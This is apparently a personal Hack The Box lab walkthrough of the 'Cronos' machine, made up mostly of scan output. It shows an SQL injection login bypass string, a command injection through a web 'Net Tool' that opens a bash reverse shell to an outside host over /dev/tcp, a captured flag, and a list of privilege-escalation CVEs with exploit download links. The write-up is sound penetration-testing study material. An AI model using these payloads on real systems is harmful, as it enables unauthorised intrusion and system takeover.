# HTB Cronos

Nmap basic scan:
![[./_resources/HTB_Cronos.resources/image.png]]
Nmap aggressive scan:
![[./_resources/HTB_Cronos.resources/image.1.png]]

Ferox buster results with "small-directories" wordlist:
![[./_resources/HTB_Cronos.resources/image.2.png]]

Ferox buster results with "small-files" wordlist:
```
403      GET      11l      32w      295c http://10.10.10.13/.htaccess
200      GET      15l      74w    3338c http://10.10.10.13/icons/ubuntu-logo.png
200      GET      379l      975w    11439c http://10.10.10.13/
403      GET      11l      32w      301c http://10.10.10.13/icons/.htaccess
403      GET      11l      32w      291c http://10.10.10.13/.html
403      GET      11l      32w      290c http://10.10.10.13/.php
403      GET      11l      32w      292c http://10.10.10.13/icons/
200      GET      379l      975w    11439c http://10.10.10.13/index.html
403      GET      11l      32w      295c http://10.10.10.13/.htpasswd
403      GET      11l      32w      297c http://10.10.10.13/icons/.html
403      GET      11l      32w      290c http://10.10.10.13/.htm
403      GET      11l      32w      296c http://10.10.10.13/.htpasswds
403      GET      11l      32w      296c http://10.10.10.13/icons/.php
403      GET      11l      32w      294c http://10.10.10.13/.htgroup
403      GET      11l      32w      301c http://10.10.10.13/icons/.htpasswd
200      GET        1l      12w      148c http://10.10.10.13/icons/blank.gif
403      GET      11l      32w      296c http://10.10.10.13/icons/.htm
403      GET      11l      32w      299c http://10.10.10.13/wp-forum.phps
403      GET      11l      32w      302c http://10.10.10.13/icons/.htpasswds
200      GET        1l      16w      236c http://10.10.10.13/icons/uu.gif
200      GET        1l      13w      185c http://10.10.10.13/icons/pie7.gif
200      GET        3l      10w      184c http://10.10.10.13/icons/ps.png
200      GET        1l        2w      124c http://10.10.10.13/icons/small/transfer.gif
200      GET        1l        4w      130c http://10.10.10.13/icons/small/comp1.gif
200      GET        3l        7w      166c http://10.10.10.13/icons/generic.red.png
200      GET        2l      16w      236c http://10.10.10.13/icons/f.gif
200      GET        1l        3w      116c http://10.10.10.13/icons/small/generic.gif
403      GET      11l      32w      299c http://10.10.10.13/.htaccess.bak
200      GET        3l      12w      178c http://10.10.10.13/icons/small/binhex.png
200      GET        2l      16w      246c http://10.10.10.13/icons/binary.gif
200      GET        1l      14w      238c http://10.10.10.13/icons/dvi.gif
200      GET        4l        9w      162c http://10.10.10.13/icons/pie1.png
200      GET        1l      13w      198c http://10.10.10.13/icons/pie1.gif
200      GET        2l      15w      223c http://10.10.10.13/icons/hand.up.gif
200      GET        3l      16w      251c http://10.10.10.13/icons/tex.gif
200      GET        3l      10w      181c http://10.10.10.13/icons/small/back.png
200      GET        1l      14w      251c http://10.10.10.13/icons/patch.gif
200      GET        1l        1w      55c http://10.10.10.13/icons/small/blank.gif
200      GET        4l        7w      177c http://10.10.10.13/icons/uuencoded.png
200      GET        3l        8w      144c http://10.10.10.13/icons/up.png
200      GET        1l      18w      248c http://10.10.10.13/icons/sound1.gif
200      GET        3l        7w      188c http://10.10.10.13/icons/link.png
200      GET        2l      15w      268c http://10.10.10.13/icons/box2.gif
200      GET        4l        7w      993c http://10.10.10.13/icons/compressed.png
200      GET        3l        7w      211c http://10.10.10.13/icons/small/patch.png
403      GET      11l      32w      300c http://10.10.10.13/icons/.htgroup
200      GET        3l        7w      187c http://10.10.10.13/icons/ball.gray.png
200      GET        4l        6w      187c http://10.10.10.13/icons/comp.gray.png
200      GET        3l        7w      162c http://10.10.10.13/icons/continued.png
200      GET        3l        6w      175c http://10.10.10.13/icons/generic.sec.png
200      GET        3l        6w      191c http://10.10.10.13/icons/diskimg.png
200      GET        4l        6w      196c http://10.10.10.13/icons/folder.open.png
403      GET      11l      32w      305c http://10.10.10.13/icons/wp-forum.phps
200      GET        1l      14w      198c http://10.10.10.13/icons/pie2.gif
403      GET      11l      32w      293c http://10.10.10.13/.htuser
200      GET        3l        9w      184c http://10.10.10.13/icons/small/broken.png
200      GET        1l      13w      225c http://10.10.10.13/icons/folder.gif
200      GET        4l        7w      165c http://10.10.10.13/icons/movie.png
200      GET        1l      13w      228c http://10.10.10.13/icons/world1.gif
200      GET        1l        8w      130c http://10.10.10.13/icons/small/sound.gif
200      GET        4l      12w      217c http://10.10.10.13/icons/small/ps.png
200      GET        1l      15w      249c http://10.10.10.13/icons/pdf.gif
200      GET        3l        8w      203c http://10.10.10.13/icons/image3.png
200      GET        1l        4w      145c http://10.10.10.13/icons/small/index.gif
200      GET        5l        7w      170c http://10.10.10.13/icons/text.png
200      GET        4l        6w      100c http://10.10.10.13/icons/small/blank.png
200      GET        2l        3w      131c http://10.10.10.13/icons/small/binhex.gif
200      GET        4l        9w      213c http://10.10.10.13/icons/sphere2.png
200      GET        1l      14w      242c http://10.10.10.13/icons/alert.black.gif
200      GET        3l        9w      206c http://10.10.10.13/icons/box2.png
200      GET        1l        2w      127c http://10.10.10.13/icons/small/generic2.gif
200      GET        1l      12w      217c http://10.10.10.13/icons/hand.right.gif
200      GET        2l      15w      249c http://10.10.10.13/icons/generic.sec.gif
200      GET        1l      13w      188c http://10.10.10.13/icons/pie0.gif
200      GET        3l        6w      218c http://10.10.10.13/icons/sphere1.png
200      GET        1l      15w      246c http://10.10.10.13/icons/comp.gray.gif
200      GET        2l      14w      243c http://10.10.10.13/icons/folder.sec.gif
403      GET      11l      32w      305c http://10.10.10.13/icons/.htaccess.bak
200      GET        3l        5w      188c http://10.10.10.13/icons/hand.up.png
200      GET        2l        2w      131c http://10.10.10.13/icons/small/comp2.gif
200      GET        2l        5w      126c http://10.10.10.13/icons/small/image.gif
200      GET        4l        9w      163c http://10.10.10.13/icons/small/text.png
200      GET        3l        6w      197c http://10.10.10.13/icons/comp.blue.png
200      GET        1l      13w      216c http://10.10.10.13/icons/back.gif
200      GET        3l        7w      172c http://10.10.10.13/icons/small/unknown.png
200      GET        2l      15w      242c http://10.10.10.13/icons/folder.open.gif
200      GET        4l        9w      218c http://10.10.10.13/icons/burst.png
200      GET        3l        4w      184c http://10.10.10.13/icons/dvi.png
200      GET        3l        9w      187c http://10.10.10.13/icons/patch.png
200      GET        1l      17w      249c http://10.10.10.13/icons/link.gif
200      GET        3l        6w      142c http://10.10.10.13/icons/left.png
200      GET        1l      16w      236c http://10.10.10.13/icons/uuencoded.gif
200      GET        3l        5w      149c http://10.10.10.13/icons/small/generic.png
200      GET        1l      16w      254c http://10.10.10.13/icons/portal.gif
200      GET        3l        3w      132c http://10.10.10.13/icons/small/tar.gif
200      GET        4l      10w      154c http://10.10.10.13/icons/pie6.png
200      GET        2l      14w      214c http://10.10.10.13/icons/continued.gif
200      GET        3l        9w      200c http://10.10.10.13/icons/quill.png
200      GET        1l      14w      267c http://10.10.10.13/icons/quill.gif
200      GET        3l        7w      159c http://10.10.10.13/icons/pie5.png
200      GET        4l        9w      152c http://10.10.10.13/icons/pie0.png
200      GET        3l        4w      176c http://10.10.10.13/icons/p.png
200      GET        3l        4w      160c http://10.10.10.13/icons/small/folder2.png
403      GET      11l      32w      299c http://10.10.10.13/icons/.htuser
200      GET        3l        8w      176c http://10.10.10.13/icons/small/folder.png
200      GET        3l      14w    1038c http://10.10.10.13/icons/compressed.gif
200      GET        2l        3w      125c http://10.10.10.13/icons/small/forward.gif
200      GET        3l        8w      166c http://10.10.10.13/icons/small/uu.png
200      GET        2l      13w      251c http://10.10.10.13/icons/box1.gif
200      GET        1l        5w      187c http://10.10.10.13/icons/small/key.gif
200      GET        1l      12w      274c http://10.10.10.13/icons/image1.gif
200      GET        3l        4w      114c http://10.10.10.13/icons/small/continued.gif
403      GET      11l      32w      298c http://10.10.10.13/icons/small/
200      GET        2l      17w      229c http://10.10.10.13/icons/text.gif
403      GET      11l      32w      307c http://10.10.10.13/icons/small/.htaccess
200      GET        3l        7w      157c http://10.10.10.13/icons/pie2.png
200      GET        3l      11w      159c http://10.10.10.13/icons/small/movie.png
200      GET        2l      15w      247c http://10.10.10.13/icons/alert.red.gif
200      GET        4l      10w      163c http://10.10.10.13/icons/small/continued.png
200      GET        3l      18w      247c http://10.10.10.13/icons/broken.gif
403      GET      11l      32w      303c http://10.10.10.13/icons/small/.html
200      GET        1l      12w      163c http://10.10.10.13/icons/down.gif
200      GET        1l      13w      285c http://10.10.10.13/icons/sphere1.gif
200      GET        3l        7w      176c http://10.10.10.13/icons/ball.red.png
200      GET        3l        8w      185c http://10.10.10.13/icons/small/burst.png
403      GET      11l      32w      302c http://10.10.10.13/icons/small/.php
200      GET        4l        6w      172c http://10.10.10.13/icons/tar.png
200      GET        1l      17w      243c http://10.10.10.13/icons/movie.gif
200      GET        3l        5w      206c http://10.10.10.13/icons/image1.png
200      GET        1l      13w      164c http://10.10.10.13/icons/up.gif
200      GET        3l        7w      208c http://10.10.10.13/icons/index.png
200      GET        5l        7w      189c http://10.10.10.13/icons/small/comp2.png
200      GET        3l        4w      156c http://10.10.10.13/icons/generic.png
200      GET        3l        6w      189c http://10.10.10.13/icons/small/transfer.png
200      GET        1l      15w      220c http://10.10.10.13/icons/generic.red.gif
200      GET        3l        6w      174c http://10.10.10.13/icons/dir.png
200      GET        3l        6w      199c http://10.10.10.13/icons/broken.png
403      GET      11l      32w      307c http://10.10.10.13/icons/small/.htpasswd
200      GET        3l        7w      189c http://10.10.10.13/icons/tex.png
200      GET        4l        7w      177c http://10.10.10.13/icons/uu.png
200      GET        2l      14w      219c http://10.10.10.13/icons/forward.gif
200      GET        3l        8w      207c http://10.10.10.13/icons/world1.png
403      GET      11l      32w      302c http://10.10.10.13/icons/small/.htm
200      GET        1l        3w      167c http://10.10.10.13/icons/diskimg.gif
200      GET        3l        4w      149c http://10.10.10.13/icons/small/generic3.png
200      GET        2l      14w      186c http://10.10.10.13/icons/pie6.gif
403      GET      11l      32w      308c http://10.10.10.13/icons/small/.htpasswds
200      GET        3l      15w      263c http://10.10.10.13/icons/screw2.gif
200      GET        1l        3w      134c http://10.10.10.13/icons/small/binary.gif
200      GET        3l        6w      173c http://10.10.10.13/icons/small/tar.png
200      GET        1l      15w      235c http://10.10.10.13/icons/burst.gif
200      GET        3l        7w      186c http://10.10.10.13/icons/unknown.png
200      GET        1l      15w      251c http://10.10.10.13/icons/comp.blue.gif
200      GET        2l      16w      193c http://10.10.10.13/icons/pie4.gif
200      GET        1l      16w      261c http://10.10.10.13/icons/world2.gif
200      GET        3l      15w      308c http://10.10.10.13/icons/bomb.gif
200      GET        3l        6w      207c http://10.10.10.13/icons/screw1.png
200      GET        1l      14w      246c http://10.10.10.13/icons/binhex.gif
200      GET        1l        4w      119c http://10.10.10.13/icons/small/sound2.gif
200      GET        3l        7w      153c http://10.10.10.13/icons/pie4.png
200      GET        2l      15w      246c http://10.10.10.13/icons/a.gif
200      GET        1l      13w      225c http://10.10.10.13/icons/dir.gif
200      GET        1l        3w      128c http://10.10.10.13/icons/small/burst.gif
200      GET        1l      16w      258c http://10.10.10.13/icons/screw1.gif
200      GET        3l        5w      189c http://10.10.10.13/icons/binary.png
200      GET        2l      14w      221c http://10.10.10.13/icons/sound2.gif
200      GET        1l        3w      122c http://10.10.10.13/icons/small/folder2.gif
200      GET        1l      14w      237c http://10.10.10.13/icons/p.gif
200      GET        3l        5w      191c http://10.10.10.13/icons/folder.sec.png
200      GET        4l      10w      159c http://10.10.10.13/icons/pie7.png
200      GET        3l        8w      233c http://10.10.10.13/icons/world2.png
200      GET        1l      14w      264c http://10.10.10.13/icons/sphere2.gif
200      GET        1l      15w      286c http://10.10.10.13/icons/image3.gif
200      GET        1l      14w      191c http://10.10.10.13/icons/pie3.gif
200      GET        3l      15w      268c http://10.10.10.13/icons/index.gif
200      GET        3l        5w      189c http://10.10.10.13/icons/a.png
200      GET        1l      12w      172c http://10.10.10.13/icons/right.gif
200      GET        3l        7w      229c http://10.10.10.13/icons/image2.png
200      GET        3l        8w      192c http://10.10.10.13/icons/hand.right.png
200      GET        3l        7w      194c http://10.10.10.13/icons/layout.png
200      GET        3l        6w      174c http://10.10.10.13/icons/small/forward.png
403      GET      11l      32w      306c http://10.10.10.13/icons/small/.htgroup
200      GET        5l        6w      202c http://10.10.10.13/icons/box1.png
200      GET        5l      11w      210c http://10.10.10.13/icons/small/key.png
200      GET        3l        9w      142c http://10.10.10.13/icons/right.png
200      GET        3l        9w      188c http://10.10.10.13/icons/small/compressed.png
200      GET        2l        6w      191c http://10.10.10.13/icons/small/doc.gif
200      GET        3l        9w      197c http://10.10.10.13/icons/portal.png
200      GET        1l        6w      139c http://10.10.10.13/icons/small/broken.gif
403      GET      11l      32w      311c http://10.10.10.13/icons/small/wp-forum.phps
200      GET        4l        7w      161c http://10.10.10.13/icons/pie3.png
200      GET        2l        4w      138c http://10.10.10.13/icons/small/image2.gif
200      GET        3l        6w      173c http://10.10.10.13/icons/alert.black.png
200      GET        3l        8w      145c http://10.10.10.13/icons/pie8.png
200      GET        1l      13w      276c http://10.10.10.13/icons/layout.gif
200      GET        2l        5w      132c http://10.10.10.13/icons/small/folder.gif
200      GET        3l        5w      169c http://10.10.10.13/icons/script.png
200      GET        1l      13w      219c http://10.10.10.13/icons/tar.gif
200      GET        1l      12w      172c http://10.10.10.13/icons/left.gif
200      GET        1l      17w      233c http://10.10.10.13/icons/ball.gray.gif
200      GET        4l        7w      203c http://10.10.10.13/icons/small/index.png
200      GET        3l        8w      205c http://10.10.10.13/icons/transfer.png
200      GET        3l        8w      212c http://10.10.10.13/icons/sound1.png
200      GET        3l        7w      143c http://10.10.10.13/icons/down.png
200      GET        3l        6w      174c http://10.10.10.13/icons/folder.png
200      GET        3l        9w      189c http://10.10.10.13/icons/small/sound.png
200      GET        2l      14w      189c http://10.10.10.13/icons/pie5.gif
200      GET        3l      11w      207c http://10.10.10.13/icons/screw2.png
200      GET        5l        7w      191c http://10.10.10.13/icons/sound2.png
200      GET        1l        4w      129c http://10.10.10.13/icons/small/back.gif
200      GET        1l      13w      173c http://10.10.10.13/icons/pie8.gif
200      GET        2l        7w      182c http://10.10.10.13/icons/small/patch.gif
200      GET        6l      10w      172c http://10.10.10.13/icons/small/binary.png
200      GET        3l        6w      187c http://10.10.10.13/icons/pdf.png
200      GET        4l        6w      182c http://10.10.10.13/icons/small/image.png
200      GET        3l        8w      241c http://10.10.10.13/icons/bomb.png
403      GET      11l      32w      311c http://10.10.10.13/icons/small/.htaccess.bak
200      GET        2l      17w      245c http://10.10.10.13/icons/unknown.gif
200      GET        4l      12w      191c http://10.10.10.13/icons/alert.red.png
200      GET        1l      16w      244c http://10.10.10.13/icons/ps.gif
200      GET        4l        7w      171c http://10.10.10.13/icons/small/sound2.png
200      GET        3l        5w      134c http://10.10.10.13/icons/small/movie.gif
200      GET        3l        6w      166c http://10.10.10.13/icons/small/generic2.png
200      GET        1l        5w      184c http://10.10.10.13/icons/small/ps.gif
200      GET        1l        1w      125c http://10.10.10.13/icons/small/uu.gif
200      GET        2l      16w      309c http://10.10.10.13/icons/image2.gif
200      GET        4l        8w      187c http://10.10.10.13/icons/back.png
200      GET        3l        5w      173c http://10.10.10.13/icons/f.png
200      GET        3l        6w      197c http://10.10.10.13/icons/binhex.png
200      GET        4l        8w      182c http://10.10.10.13/icons/small/image2.png
200      GET        3l        5w      105c http://10.10.10.13/icons/blank.png
200      GET        1l        3w      128c http://10.10.10.13/icons/small/compressed.gif
403      GET      11l      32w      305c http://10.10.10.13/icons/small/.htuser
200      GET        2l      14w      205c http://10.10.10.13/icons/ball.red.gif
200      GET        1l      13w      242c http://10.10.10.13/icons/transfer.gif
200      GET        1l      18w      242c http://10.10.10.13/icons/script.gif
200      GET        2l      16w      221c http://10.10.10.13/icons/generic.gif
200      GET        1l        2w      113c http://10.10.10.13/icons/small/generic3.gif
200      GET        3l      13w      222c http://10.10.10.13/icons/small/doc.png
200      GET        3l        7w      190c http://10.10.10.13/icons/small/comp1.png
200      GET        2l      16w      242c http://10.10.10.13/icons/c.gif
200      GET        1l        1w      131c http://10.10.10.13/icons/small/unknown.gif
200      GET        3l        7w      176c http://10.10.10.13/icons/c.png
200      GET        1l        4w      128c http://10.10.10.13/icons/small/text.gif
200      GET        3l        5w      188c http://10.10.10.13/icons/forward.png
200      GET      815l    3019w    36057c http://10.10.10.13/icons/README.html
[####################] - 25s    34491/34491  0s      found:246    errors:53     
[####################] - 21s    11425/11425  553/s  http://10.10.10.13/ 
[####################] - 20s    11425/11425  587/s  http://10.10.10.13/icons/ 
[####################] - 8s    11425/11425  1279/s  http://10.10.10.13/icons/small/
```

One of the directories is <http://10.10.10.13/wp-forum.phps> which indicates a wordpress site hosted on this apache server. After running WPscan, I obtained the following information below. However, the majority of the above ferox results are useless.:

```
_______________________________________________________________
        __          _______  _____
        \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___  ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |    ____) | (__| (_| | | | |
            \/  \/  |_|    |_____/ \___|\__,_|_| |_|
        WordPress Security Scanner by the WPScan Team
                        Version 3.8.22
      Sponsored by Automattic - https://automattic.com/
      @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.
[+] URL: http://10.10.10.13/wp-forum.phps/ [10.10.10.13]
[+] Started: Fri Dec 30 17:09:15 2022
Interesting Finding(s):
[+] Headers
| Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
| Found By: Headers (Passive Detection)
| Confidence: 100%
[+] A backup directory has been found: http://10.10.10.13/wp-forum.phps/wp-content/backup-db/
| Found By: Direct Access (Aggressive Detection)
| Confidence: 70%
| Reference: https://github.com/wpscanteam/wpscan/issues/422
[+] This site has 'Must Use Plugins': http://10.10.10.13/wp-forum.phps/wp-content/mu-plugins/
| Found By: Direct Access (Aggressive Detection)
| Confidence: 80%
| Reference: http://codex.wordpress.org/Must_Use_Plugins
Fingerprinting the version - Time: 00:00:20 <===========================================================================> (695 / 695) 100.00% Time: 00:00:20
[i] The WordPress version could not be detected.
[i] The main theme could not be detected.
[+] Enumerating All Plugins (via Passive Methods)
[i] No plugins Found.
[+] Enumerating Config Backups (via Passive and Aggressive Methods)
Checking Config Backups - Time: 00:00:04 <=============================================================================> (137 / 137) 100.00% Time: 00:00:04
[i] No Config Backups Found.
[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
[+] Finished: Fri Dec 30 17:09:43 2022
[+] Requests Done: 886
[+] Cached Requests: 5
[+] Data Sent: 214.178 KB
[+] Data Received: 12.283 MB
[+] Memory used: 210.57 MB
[+] Elapsed time: 00:00:28
```

Here are the main 3 sections that standout to me.:
**Interesting Finding(s):**

**\[+\] Headers**
**| Interesting Entry: Server: Apache/2.4.18 (Ubuntu)**
**| Found By: Headers (Passive Detection)**
**| Confidence: 100%**

**\[+\] A backup directory has been found: http://10.10.10.13/wp-forum.phps/wp-content/backup-db/**
**| Found By: Direct Access (Aggressive Detection)**
**| Confidence: 70%**
**| Reference: https://github.com/wpscanteam/wpscan/issues/422**

**\[+\] This site has 'Must Use Plugins': http://10.10.10.13/wp-forum.phps/wp-content/mu-plugins/**
**| Found By: Direct Access (Aggressive Detection)**
**| Confidence: 80%**
**| Reference: http://codex.wordpress.org/Must\_Use\_Plugins**

In this case, I hit a wall. It turns out I needed to enumerate DNS further. Using nslookup, I found the folowing subdomain.:
![[./_resources/HTB_Cronos.resources/image.3.png]]

When there is a TCP DNS, ALWAYS enumerate this further. Often times, this just means we can get additional domains to point them to the IP address in the /etc/hosts file.:
![[./_resources/HTB_Cronos.resources/image.4.png]]

In running ferox buster again with the small-files wordlist, I obtained better results from the new admin.cronos.htb domain.:
```
200      GET      56l      139w    1547c http://admin.cronos.htb/
302      GET        0l        0w        0c http://admin.cronos.htb/logout.php => index.php
403      GET      11l      32w      300c http://admin.cronos.htb/.htaccess
403      GET      11l      32w      296c http://admin.cronos.htb/.html
403      GET      11l      32w      295c http://admin.cronos.htb/.php
302      GET      20l      38w      439c http://admin.cronos.htb/welcome.php => index.php
403      GET      11l      32w      300c http://admin.cronos.htb/.htpasswd
200      GET      56l      139w    1547c http://admin.cronos.htb/index.php
200      GET        0l        0w        0c http://admin.cronos.htb/config.php
403      GET      11l      32w      295c http://admin.cronos.htb/.htm
302      GET        0l        0w        0c http://admin.cronos.htb/session.php => index.php
403      GET      11l      32w      301c http://admin.cronos.htb/.htpasswds
403      GET      11l      32w      299c http://admin.cronos.htb/.htgroup
403      GET      11l      32w      304c http://admin.cronos.htb/wp-forum.phps
403      GET      11l      32w      304c http://admin.cronos.htb/.htaccess.bak
403      GET      11l      32w      298c http://admin.cronos.htb/.htuser
[####################] - 12s    11425/11425  0s      found:16      errors:0     
[####################] - 12s    11425/11425  923/s  http://admin.cronos.htb/
```
Same wordlist used for cronos.htb.:
```
200      GET      85l      137w    2319c http://cronos.htb/index.php
200      GET      85l      137w    2319c http://cronos.htb/
200      GET        0l        0w        0c http://cronos.htb/favicon.ico
403      GET      11l      32w      294c http://cronos.htb/.htaccess
200      GET      23l      59w      914c http://cronos.htb/web.config
200      GET        2l        3w      24c http://cronos.htb/robots.txt
403      GET      11l      32w      290c http://cronos.htb/.html
403      GET      11l      32w      289c http://cronos.htb/.php
403      GET      11l      32w      294c http://cronos.htb/.htpasswd
403      GET      11l      32w      289c http://cronos.htb/.htm
403      GET      11l      32w      295c http://cronos.htb/.htpasswds
403      GET      11l      32w      293c http://cronos.htb/.htgroup
403      GET      11l      32w      298c http://cronos.htb/wp-forum.phps
403      GET      11l      32w      298c http://cronos.htb/.htaccess.bak
403      GET      11l      32w      292c http://cronos.htb/.htuser
[####################] - 7s    11425/11425  0s      found:15      errors:0     
[####################] - 7s    11425/11425  1564/s  http://cronos.htb/
```

I was able to use sql injection to get passed the login screen for admin.cronos.htb. I used the following.:
```
' or 1=1-- -
```
After logging in, the only thing available to me was a "Net Tool v0.1" Which I quickly realized I could use through burpsuite, (after viewing the responses to my queries from the page shown below) to perform arbitrary command execution.

Net Tool:
![[./_resources/HTB_Cronos.resources/image.5.png]]
Burp: Modified request and response:
![[./_resources/HTB_Cronos.resources/image.6.png]]
A user named "**Noulis**" exists here.
I was also able to get the user.txt flag.:
```
d6d950b7cf56737ae4b22961a74af7aa
```

It seems that the webserver is likely taking the command and the host and concatenating them together and then executing it. If that’s true, I can probably inject into either parameter. In this case, I can just give it a reverse shell to gain low priv access. I tried numerous time and all failed despite being able to successfully upload netcat. However, I found that the following worked.:
```
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.5/4444+0>%261'%26host=
```

After transferring linpeas and running it, the following CVEs showed up.:

**Vulnerable to CVE-2021-4034**
**Potentially Vulnerable to CVE-2022-2588**

Additional LESS PROBABLE CVEs found here.:
```
[+] [CVE-2017-16995] eBPF_verifier
  Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
  Exposure: highly probable
  Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
  Download URL: https://www.exploit-db.com/download/45010
  Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
[+] [CVE-2016-5195] dirtycow
  Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
  Exposure: highly probable
  Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
  Download URL: https://www.exploit-db.com/download/40611
  Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
[+] [CVE-2016-5195] dirtycow 2
  Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
  Exposure: highly probable
  Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
  Download URL: https://www.exploit-db.com/download/40839
  ext-url: https://www.exploit-db.com/download/40847
  Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
[+] [CVE-2021-4034] PwnKit
  Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
  Exposure: probable
  Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
  Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
[+] [CVE-2021-3156] sudo Baron Samedit 2
  Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
  Exposure: probable
  Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
  Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
[+] [CVE-2017-7308] af_packet
  Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
  Exposure: probable
  Tags: [ ubuntu=16.04 ]{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
  Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
  ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
  Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels
[+] [CVE-2017-6074] dccp
  Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
  Exposure: probable
  Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
  Download URL: https://www.exploit-db.com/download/41458
  Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass
[+] [CVE-2017-1000112] NETIF_F_UFO
  Details: http://www.openwall.com/lists/oss-security/2017/08/13/1
  Exposure: probable
  Tags: ubuntu=14.04{kernel:4.4.0-*},[ ubuntu=16.04 ]{kernel:4.8.0-*}
  Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
  ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
  Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels
[+] [CVE-2016-8655] chocobo_root
  Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
  Exposure: probable
  Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic}
  Download URL: https://www.exploit-db.com/download/40871
  Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled
[+] [CVE-2016-4557] double-fdput()
  Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
  Exposure: probable
  Tags: [ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
  Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
  Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
  Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
  Exposure: less probable
  Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
  Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
  Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
[+] [CVE-2022-2586] nft_object UAF
  Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
  Exposure: less probable
  Tags: ubuntu=(20.04){kernel:5.12.13}
  Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
  Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
[+] [CVE-2021-3156] sudo Baron Samedit
  Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
  Exposure: less probable
  Tags: mint=19,ubuntu=18|20, debian=10
  Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
  Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
  Exposure: less probable
  Tags: ubuntu=20.04{kernel:5.8.0-*}
  Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
  ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
  Comments: ip_tables kernel module must be loaded
[+] [CVE-2019-18634] sudo pwfeedback
  Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
  Exposure: less probable
  Tags: mint=19
  Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
  Comments: sudo configuration requires pwfeedback to be enabled.
[+] [CVE-2019-15666] XFRM_UAF
  Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
  Exposure: less probable
  Download URL: 
  Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled
[+] [CVE-2018-1000001] RationalLove
  Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
  Exposure: less probable
  Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
